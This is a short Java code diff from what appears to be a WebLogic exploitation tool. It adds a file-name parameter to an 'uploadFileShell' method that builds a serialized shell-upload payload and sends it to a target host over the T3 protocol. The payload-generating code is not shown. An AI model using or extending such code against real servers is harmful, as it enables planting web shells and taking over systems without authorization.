@@ -31,8 +31,8 @@ public class WebLogicOperation {
         T3ProtocolOperation.send(host, port, payload);
     }
 
-    public static void uploadFileShell(String host, String port) throws Exception {
-        byte[] payload = SerialDataGenerator.serialUploadShellDatas();
+    public static void uploadFileShell(String host, String port, String fileName) throws Exception {
+        byte[] payload = SerialDataGenerator.serialUploadShellDatas(fileName);
         T3ProtocolOperation.send(host, port, payload);
     }
 
